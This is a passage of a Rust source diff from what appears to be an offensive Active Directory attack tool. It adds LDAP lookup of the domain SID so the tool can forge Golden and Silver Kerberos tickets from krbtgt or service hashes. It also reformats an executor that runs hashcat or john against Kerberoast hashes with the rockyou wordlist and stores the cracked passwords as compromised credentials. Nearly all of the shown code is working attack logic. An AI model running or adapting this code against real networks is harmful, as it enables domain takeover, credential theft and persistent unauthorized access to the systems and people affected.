+                Ok(c) => c,
+                Err(e) => {
+                    return StepResult {
+                        success: false,
+                        output: format!("LDAP: {e}"),
+                        new_credentials: 0,
+                        new_admin_hosts: 0,
+                    };
+                }
+            };
+
+        let results = match conn
+            .custom_search("(objectClass=domain)", &["objectSid"])
+            .await
+        {
+            Ok(r) => r,
+            Err(e) => {
+                return StepResult {
+                    success: false,
+                    output: format!("Domain SID lookup: {e}"),
+                    new_credentials: 0,
+                    new_admin_hosts: 0,
+                };
+            }
+        };
+        let _ = conn.disconnect().await;
+
+        results
+            .first()
+            .and_then(|entry| entry.bin_attrs.get("objectSid"))
+            .and_then(|sids| sids.first())
+            .map(|bytes| {
+                let full = parse_sid_bytes(bytes);
+                domain_sid_prefix(&full)
+            })
+            .unwrap_or_else(|| {
+                warn!("Could not resolve domain SID, golden ticket may fail");
+                "S-1-5-21-0-0-0".to_string()
+            })
+    };
+    let domain_sid = domain_sid.as_str();
 
     // Decode the krbtgt hash
     let hash_bytes: Vec<u8> = hex_decode(krbtgt_hash);
     if hash_bytes.len() != 16 {
         return StepResult {
             success: false,
-            output: format!("Invalid krbtgt hash length: {} (expected 32 hex chars)", krbtgt_hash.len()),
+            output: format!(
+                "Invalid krbtgt hash length: {} (expected 32 hex chars)",
+                krbtgt_hash.len()
+            ),
             new_credentials: 0,
             new_admin_hosts: 0,
         };
@@ -1778,8 +2187,12 @@ async fn exec_golden_ticket(
         kerberos::ETYPE_RC4_HMAC,
     ) {
         Ok(tgt) => {
-            info!("  {} Golden Ticket forged for {}/{}", "✓".green(),
-                target_user.bold().red(), ctx.domain.cyan());
+            info!(
+                "  {} Golden Ticket forged for {}/{}",
+                "✓".green(),
+                target_user.bold().red(),
+                ctx.domain.cyan()
+            );
 
             // Save as kirbi
             let kirbi_data = overthrone_hunter::tickets::to_kirbi(&tgt);
@@ -1798,8 +2211,12 @@ async fn exec_golden_ticket(
                 admin_on: vec![ctx.dc_ip.clone()],
             });
 
-            let msg = format!("Golden Ticket forged: {} @ {} ({} bytes kirbi)",
-                target_user, ctx.domain, kirbi_data.len());
+            let msg = format!(
+                "Golden Ticket forged: {} @ {} ({} bytes kirbi)",
+                target_user,
+                ctx.domain,
+                kirbi_data.len()
+            );
             StepResult {
                 success: true,
                 output: msg,
@@ -1816,16 +2233,67 @@ async fn exec_golden_ticket(
     }
 }
 
-
 async fn exec_silver_ticket(
     ctx: &ExecContext,
     state: &mut EngagementState,
     service_hash: &str,
     spn: &str,
 ) -> StepResult {
-    info!("{}", format!("  Forging Silver Ticket for {}...", spn).red().bold());
+    info!(
+        "{}",
+        format!("  Forging Silver Ticket for {}...", spn)
+            .red()
+            .bold()
+    );
 
-    let domain_sid = "S-1-5-21-0-0-0"; // In production, from LDAP
+    // Resolve domain SID from LDAP (query the domain root object)
+    let domain_sid = {
+        let (user, pass, _) = ctx.effective_creds();
+        let mut conn =
+            match ldap::LdapSession::connect(&ctx.dc_ip, &ctx.domain, user, pass, ctx.use_ldaps)
+                .await
+            {
+                Ok(c) => c,
+                Err(e) => {
+                    return StepResult {
+                        success: false,
+                        output: format!("LDAP: {e}"),
+                        new_credentials: 0,
+                        new_admin_hosts: 0,
+                    };
+                }
+            };
+
+        let results = match conn
+            .custom_search("(objectClass=domain)", &["objectSid"])
+            .await
+        {
+            Ok(r) => r,
+            Err(e) => {
+                return StepResult {
+                    success: false,
+                    output: format!("Domain SID lookup: {e}"),
+                    new_credentials: 0,
+                    new_admin_hosts: 0,
+                };
+            }
+        };
+        let _ = conn.disconnect().await;
+
+        results
+            .first()
+            .and_then(|entry| entry.bin_attrs.get("objectSid"))
+            .and_then(|sids| sids.first())
+            .map(|bytes| {
+                let full = parse_sid_bytes(bytes);
+                domain_sid_prefix(&full)
+            })
+            .unwrap_or_else(|| {
+                warn!("Could not resolve domain SID, golden ticket may fail");
+                "S-1-5-21-0-0-0".to_string()
+            })
+    };
+    let domain_sid = domain_sid.as_str(); // In production, from LDAP
     let hash_bytes: Vec<u8> = hex_decode(service_hash);
     if hash_bytes.len() != 16 {
         return StepResult {
@@ -1861,8 +2329,12 @@ async fn exec_silver_ticket(
                 state.admin_hosts.insert(host.to_string());
             }
 
-            let msg = format!("Silver Ticket forged: {} for {} ({} bytes)",
-                target_user, spn, kirbi_data.len());
+            let msg = format!(
+                "Silver Ticket forged: {} for {} ({} bytes)",
+                target_user,
+                spn,
+                kirbi_data.len()
+            );
             info!("{} {}", "  ✓".green(), msg);
             StepResult {
                 success: true,
@@ -1879,7 +2351,6 @@ async fn exec_silver_ticket(
         },
     }
 }
-
 
 // ═══════════════════════════════════════════════════════════
 // Hash Cracking Executor (external tool invocation)
@@ -1915,20 +2386,28 @@ async fn exec_crack_hashes(
 
     // Try hashcat first, fall back to john
     let (tool, args) = if which_tool("hashcat").await {
-        ("hashcat", vec![
-            "-m".to_string(), "13100".to_string(), // Kerberoast TGS-REP
-            "-a".to_string(), "0".to_string(),      // dictionary attack
-            hash_file.clone(),
-            "/usr/share/wordlists/rockyou.txt".to_string(),
-            "--potfile-disable".to_string(),
-            "--force".to_string(),
-        ])
+        (
+            "hashcat",
+            vec![
+                "-m".to_string(),
+                "13100".to_string(), // Kerberoast TGS-REP
+                "-a".to_string(),
+                "0".to_string(), // dictionary attack
+                hash_file.clone(),
+                "/usr/share/wordlists/rockyou.txt".to_string(),
+                "--potfile-disable".to_string(),
+                "--force".to_string(),
+            ],
+        )
     } else if which_tool("john").await {
-        ("john", vec![
-            hash_file.clone(),
-            "--wordlist=/usr/share/wordlists/rockyou.txt".to_string(),
-            "--format=krb5tgs".to_string(),
-        ])
+        (
+            "john",
+            vec![
+                hash_file.clone(),
+                "--wordlist=/usr/share/wordlists/rockyou.txt".to_string(),
+                "--format=krb5tgs".to_string(),
+            ],
+        )
     } else {
         return StepResult {
             success: false,
@@ -1943,23 +2422,27 @@ async fn exec_crack_hashes(
     // Run the cracking tool with a timeout
     let output = match tokio::time::timeout(
         tokio::time::Duration::from_secs(300), // 5 minute timeout
-        tokio::process::Command::new(tool)
-            .args(&args)
-            .output(),
-    ).await {
+        tokio::process::Command::new(tool).args(&args).output(),
+    )
+    .await
+    {
         Ok(Ok(output)) => output,
-        Ok(Err(e)) => return StepResult {
-            success: false,
-            output: format!("{} execution failed: {e}", tool),
-            new_credentials: 0,
-            new_admin_hosts: 0,
-        },
-        Err(_) => return StepResult {
-            success: false,
-            output: format!("{} timed out after 300s", tool),
-            new_credentials: 0,
-            new_admin_hosts: 0,
-        },
+        Ok(Err(e)) => {
+            return StepResult {
+                success: false,
+                output: format!("{} execution failed: {e}", tool),
+                new_credentials: 0,
+                new_admin_hosts: 0,
+            };
+        }
+        Err(_) => {
+            return StepResult {
+                success: false,
+                output: format!("{} timed out after 300s", tool),
+                new_credentials: 0,
+                new_admin_hosts: 0,
+            };
+        }
     };
 
     // Parse cracked results
@@ -1975,9 +2458,15 @@ async fn exec_crack_hashes(
             if parts.len() == 2 {
                 let (hash_or_user, password) = (parts[0].trim(), parts[1].trim());
                 if !password.is_empty() && password.len() < 128 {
-                    info!("  {} Cracked: {}:{}", "✓".green(),
-                        hash_or_user.bold(), password.red());
-                    state.cracked.insert(hash_or_user.to_string(), password.to_string());
+                    info!(
+                        "  {} Cracked: {}:{}",
+                        "✓".green(),
+                        hash_or_user.bold(),
+                        password.red()
+                    );
+                    state
+                        .cracked
+                        .insert(hash_or_user.to_string(), password.to_string());
 
                     // Try to map back to a username and register as credential
                     state.add_credential(CompromisedCred {
@@ -1998,7 +2487,12 @@ async fn exec_crack_hashes(
     // Cleanup
     let _ = tokio::fs::remove_file(&hash_file).await;
 
-    let msg = format!("Cracked {}/{} hashes using {}", cracked_count, hashes.len(), tool);
+    let msg = format!(
+        "Cracked {}/{} hashes using {}",
+        cracked_count,
+        hashes.len(),
+        tool
+    );
     info!("{} {}", "  ✓".green(), msg);
     StepResult {
         success: cracked_count > 0,
@@ -2007,7 +2501,6 @@ async fn exec_crack_hashes(
         new_admin_hosts: 0,
     }
 }
-
 
 /// Check if a tool is available in PATH
 async fn which_tool(name: &str) -> bool {
@@ -2019,7 +2512,6 @@ async fn which_tool(name: &str) -> bool {
         .unwrap_or(false)
 }
 
-
 /// Decode hex string to bytes
 fn hex_decode(hex: &str) -> Vec<u8> {
     let hex = hex.trim();
@@ -2027,4 +2519,35 @@ fn hex_decode(hex: &str) -> Vec<u8> {
         .step_by(2)
         .filter_map(|i| u8::from_str_radix(&hex[i..i + 2], 16).ok())
         .collect()
+}
+
+/// Parse a SID from bytes to string
+fn parse_sid_bytes(bytes: &[u8]) -> String {
+    if bytes.len() < 8 {
+        return "INVALID-SID".to_string();
+    }
+    let revision = bytes[0];
+    let sub_count = bytes[1] as usize;
+    let authority = u64::from_be_bytes([
+        0, 0, bytes[2], bytes[3], bytes[4], bytes[5], bytes[6], bytes[7],
+    ]);
+    let mut sid = format!("S-{}-{}", revision, authority);
+    for i in 0..sub_count {
+        let off = 8 + (i * 4);
+        if off + 4 > bytes.len() {
+            break;
+        }
+        let sub = u32::from_le_bytes([bytes[off], bytes[off + 1], bytes[off + 2], bytes[off + 3]]);
+        sid.push_str(&format!("-{}", sub));
+    }
+    sid
+}
+
+/// Strip the RID to get just the domain SID prefix
+/// S-1-5-21-x-y-z-1234 → S-1-5-21-x-y-z
+fn domain_sid_prefix(full_sid: &str) -> String {
+    match full_sid.rsplitn(2, '-').last() {
+        Some(prefix) => prefix.to_string(),
+        None => full_sid.to_string(),
+    }
 }
